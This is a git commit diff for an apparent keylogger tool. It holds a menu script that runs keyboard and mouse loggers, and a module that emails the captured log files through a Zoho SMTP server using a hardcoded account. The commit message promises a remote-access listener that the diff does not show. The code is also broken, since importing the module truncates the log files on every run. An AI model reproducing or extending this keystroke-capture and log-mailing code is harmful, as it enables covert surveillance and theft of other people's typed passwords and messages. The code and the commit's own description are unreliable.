8365466632aff1aca9c3210bbfbb4405c174fc37
Sami <lolipop66611@gmail.com>
2022-07-29 10:37:11 +0200

    Add remote access file, to automate setting up a listener and running commands

--- main.py
+++ main.py
@@ -1,8 +1,15 @@
 import send_logs as sl
+import os
+from termcolor import colored
 
+# Opens ASCII Art where it says: 'Welcome to flash logger'
 ori_logo = open("ori-logo.txt", "r")
 ori_logo = ori_logo.read()
+
+# Prints logo
 print(ori_logo)
+
+# General Information about Product Use and licensing
 print("© Copyright Sami Hindi 2022")
 print("This product is licensed under the GNU General Public License")
 print("For any questions or inquiries, please send me an E-Mail at 'fujiwarachoki@zohomail.eu'")
@@ -10,6 +17,8 @@ print("For Educational Purposes only")
 print("\n\n")
 print("------------------------------------------------------------------------------------------------------")
 print("\n\n")
+
+# Asks User which option they want to perform
 print("PRESS 'm' FOR MOUSE LOGGER")
 print("PRESS 'k' FOR KEYBOARD LOGGER")
 print("PRESS 's' TO SEND LOGS TO EMAIL")
@@ -18,14 +27,18 @@ choice = input()
 print("\n\n")
 print("------------------------------------------------------------------------------------------------------")
 
+# Reads file based on user's choice, then takes python script inside it, and runs it
 if choice == 'm':
     mouse_logger = open("mouse_logging.py")
+    # Reads
     exec(mouse_logger.read())
 elif choice == 'k':
     keyboard_logger = open("key_logging.py")
     exec(keyboard_logger.read())
-
+# Will ask for User's Email to send them the logs
 elif choice == 's':
+    if os.stat("Key_logs/keyboard_logs.txt").st_size == 0 or os.stat("Key_logs/mouse_logs.txt").st_size == 0:
+        print(colored("WARNING: ", 'red') + "Please use one of the Loggers first, since both Log-Files are empty!")
     print("\n\n")
     print("------------------------------------------------------------------------------------------------------")
     print("ENTER YOUR EMAIL")
--- send_logs.py
+++ send_logs.py
@@ -1,13 +1,19 @@
 import smtplib
 from email.message import EmailMessage
 
+# Will create new log files if User uses program for first time!
+# Not in main.py, since this file (send_logs.py) is imported first.
+open("Key_logs/mouse_logs.txt", "w")
+open("Key_logs/keyboard_logs.txt", "w")
 
+
+# Function to send an email with two log-files attached
 def send_email(subject, message, destination):
     # Here you are to replace smtp.example.com with your Email Providers SMTP Servers (and if necessary - the port)
-    server = smtplib.SMTP('smtp.example.com', 587)
+    server = smtplib.SMTP('smtp.zoho.eu', 465)
     server.starttls()
-    # This is where you would replace "-------" with your Email and Password to log into your Account
-    server.login('-------', '-------')
+    # This is where you wou7ld replace "-------" with your Email and Password to log into your Account
+    server.login('fujiwarachoki@zohomail.eu', '')
 
     msg = EmailMessage()
 
@@ -20,8 +26,13 @@ def send_email(subject, message, destination):
     msg['To'] = destination
     server.send_message(msg)
 
+
 # Opening Log Files and reading into separate Strings
+
+# Mouse Log
 key_logs = open("Key_logs/keyboard_logs.txt")
 logs1 = key_logs.read()
+
+# Keyboard Log
 mouse_logs = open("Key_logs/mouse_logs.txt")
 logs2 = mouse_logs.read()
